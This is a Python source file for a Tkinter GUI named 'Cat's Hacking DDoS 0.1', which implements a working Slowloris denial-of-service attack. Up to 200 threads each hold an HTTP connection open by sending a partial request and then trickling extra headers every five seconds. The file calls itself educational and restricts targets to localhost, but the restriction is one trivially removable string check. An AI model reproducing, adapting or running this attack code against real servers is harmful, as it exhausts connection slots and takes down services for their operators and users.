#!/usr/bin/env python3
"""
Cat's Hacking DDoS 0.1 — Slowloris-style connection simulator
Educational purpose only. Use ONLY against your own localhost!
"""

import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import socket
import time
import random

class CatDDoS:
    def __init__(self, root):
        self.root = root
        self.root.title("🐱 Cat's Hacking DDoS 0.1")
        self.root.geometry("720x650")
        self.root.configure(bg='black')
        
        # ===== TITLE =====
        title = tk.Label(
            root,
            text="🐱 CAT'S HACKING DDoS 0.1",
            fg='blue',
            bg='black',
            font=('Courier', 22, 'bold')
        )
        title.pack(pady=12)
        
        sub = tk.Label(
            root,
            text="Slowloris-style Connection Simulator — Educational Only",
            fg='#4488ff',
            bg='black',
            font=('Courier', 11)
        )
        sub.pack(pady=2)
        
        warn = tk.Label(
            root,
            text="⚠️ USE ONLY AGAINST YOUR OWN LOCALHOST (127.0.0.1)",
            fg='red',
            bg='black',
            font=('Courier', 10, 'bold')
        )
        warn.pack(pady=6)
        
        # ===== TARGET FRAME =====
        frame = tk.Frame(root, bg='black')
        frame.pack(pady=8)
        
        tk.Label(frame, text="Target:", fg='blue', bg='black', font=('Courier', 12)).pack(side='left', padx=5)
        self.target_entry = tk.Entry(frame, width=18, fg='blue', bg='black', insertbackground='blue', font=('Courier', 12))
        self.target_entry.pack(side='left', padx=5)
        self.target_entry.insert(0, "127.0.0.1")
        
        tk.Label(frame, text="Port:", fg='blue', bg='black', font=('Courier', 12)).pack(side='left', padx=5)
        self.port_entry = tk.Entry(frame, width=8, fg='blue', bg='black', insertbackground='blue', font=('Courier', 12))
        self.port_entry.pack(side='left', padx=5)
        self.port_entry.insert(0, "8080")
        
        tk.Label(frame, text="Threads:", fg='blue', bg='black', font=('Courier', 12)).pack(side='left', padx=5)
        self.threads_entry = tk.Entry(frame, width=6, fg='blue', bg='black', insertbackground='blue', font=('Courier', 12))
        self.threads_entry.pack(side='left', padx=5)
        self.threads_entry.insert(0, "50")
        
        # ===== BUTTONS =====
        btn_frame = tk.Frame(root, bg='black')
        btn_frame.pack(pady=10)
        
        self.start_btn = tk.Button(
            btn_frame,
            text="🐱 START SLOWLORIS",
            fg='blue',
            bg='black',
            activeforeground='cyan',
            activebackground='#1a1a1a',
            font=('Courier', 13, 'bold'),
            command=self.start_attack,
            relief='raised',
            bd=3,
            padx=20,
            pady=8
        )
        self.start_btn.pack(side='left', padx=10)
        
        self.stop_btn = tk.Button(
            btn_frame,
            text="🛑 STOP",
            fg='blue',
            bg='black',
            activeforeground='red',
            activebackground='#1a1a1a',
            font=('Courier', 13, 'bold'),
            command=self.stop_attack,
            relief='raised',
            bd=3,
            padx=20,
            pady=8
        )
        self.stop_btn.pack(side='left', padx=10)
        
        self.clear_btn = tk.Button(
            btn_frame,
            text="🧹 CLEAR",
            fg='blue',
            bg='black',
            activeforeground='cyan',
            activebackground='#1a1a1a',
            font=('Courier', 12, 'bold'),
            command=self.clear_output,
            relief='raised',
            bd=3,
            padx=15,
            pady=8
        )
        self.clear_btn.pack(side='left', padx=10)
        
        # ===== STATUS =====
        self.status = tk.Label(
            root,
            text="🐱 Ready. Slowloris simulator — localhost only.",
            fg='#4488ff',
            bg='black',
            font=('Courier', 10)
        )
        self.status.pack(pady=5)
        
        # ===== OUTPUT =====
        self.output = scrolledtext.ScrolledText(
            root,
            wrap=tk.WORD,
            width=80,
            height=18,
            fg='blue',
            bg='black',
            insertbackground='blue',
            font=('Courier', 10),
            bd=2,
            relief='sunken'
        )
        self.output.pack(padx=15, pady=10, fill=tk.BOTH, expand=True)
        
        # Tags
        self.output.tag_configure('header', foreground='cyan', font=('Courier', 11, 'bold'))
        self.output.tag_configure('info', foreground='#4488ff')
        self.output.tag_configure('success', foreground='lightgreen')
        self.output.tag_configure('error', foreground='red')
        self.output.tag_configure('cat', foreground='#ff8800')
        
        # ===== STATE =====
        self.running = False
        self.threads = []
        
        # Initial log
        self.log("🐱 Cat's Hacking DDoS 0.1 — LOADED", 'header')
        self.log("=" * 65, 'header')
        self.log("Slowloris-style connection simulator for educational purposes.", 'info')
        self.log("⚠️ USE ONLY AGAINST YOUR OWN LOCALHOST (127.0.0.1)", 'error')
        self.log("=" * 65, 'header')
        self.log("🐱 Meow... ready to simulate.\n", 'cat')
    
    def log(self, msg, tag='info'):
        self.output.insert(tk.END, msg + "\n", tag)
        self.output.see(tk.END)
        self.root.update_idletasks()
    
    def clear_output(self):
        self.output.delete(1.0, tk.END)
        self.log("🧹 Output cleared.", 'header')
    
    def slow_connection(self, tid, target, port):
        """Open one slow connection — never close it."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))
            self.log(f"[Thread {tid}] ✅ Connected to {target}:{port}", 'success')
            
            # Send partial HTTP request (no final CRLF)
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Cat-Slowloris/0.1\r\n"
                f"Connection: keep-alive\r\n"
            )
            sock.send(request.encode())
            self.log(f"[Thread {tid}] 📤 Partial request sent", 'info')
            
            # Keep connection alive
            counter = 0
            while self.running:
                header = f"X-KeepAlive-{tid}: {counter}-{random.randint(1000,9999)}\r\n"
                sock.send(header.encode())
                counter += 1
                time.sleep(5)
                
            sock.close()
            self.log(f"[Thread {tid}] 🔌 Connection closed", 'info')
            
        except Exception as e:
            if self.running:
                self.log(f"[Thread {tid}] ❌ Error: {e}", 'error')
    
    def start_attack(self):
        if self.running:
            messagebox.showwarning("Already Running", "Slowloris is already active!")
            return
        
        target = self.target_entry.get().strip()
        port = int(self.port_entry.get().strip())
        threads = int(self.threads_entry.get().strip())
        
        # Safety lock — only localhost allowed
        if target not in ["127.0.0.1", "localhost"]:
            messagebox.showerror("⚠️ Safety Lock", "This tool only works on localhost (127.0.0.1) for safety!")
            return
        
        if port < 1 or port > 65535:
            messagebox.showerror("Invalid Port", "Port must be between 1 and 65535.")
            return
        
        if threads < 1 or threads > 200:
            messagebox.showerror("Invalid Threads", "Threads must be between 1 and 200.")
            return
        
        self.running = True
        self.start_btn.config(state='disabled')
        self.status.config(text=f"🐱 Attacking {target}:{port} with {threads} threads...")
        
        self.log(f"🐱 STARTING SLOWLORIS on {target}:{port}", 'header')
        self.log(f"📊 Threads: {threads}", 'info')
        self.log("-" * 50, 'header')
        
        # Launch threads
        for i in range(1, threads + 1):
            t = threading.Thread(target=self.slow_connection, args=(i, target, port), daemon=True)
            t.start()
            self.threads.append(t)
            if i % 10 == 0:
                self.log(f"🐱 Deployed {i}/{threads} threads...", 'cat')
        
        self.log(f"\n✅ {threads} threads deployed. Press STOP to end.", 'success')
    
    def stop_attack(self):
        if not self.running:
            return
        self.running = False
        self.start_btn.config(state='normal')
        self.status.config(text="🐱 Stopped. Connections closing...")
        self.log("\n🛑 STOPPING attack...", 'error')
        self.log("⏳ Waiting for threads to close...", 'info')
        self.threads.clear()
        self.log("✅ All connections closed.", 'success')
        self.log("=" * 65, 'header')

# ===== MAIN =====
if __name__ == "__main__":
    root = tk.Tk()
    app = CatDDoS(root)
    root.mainloop()
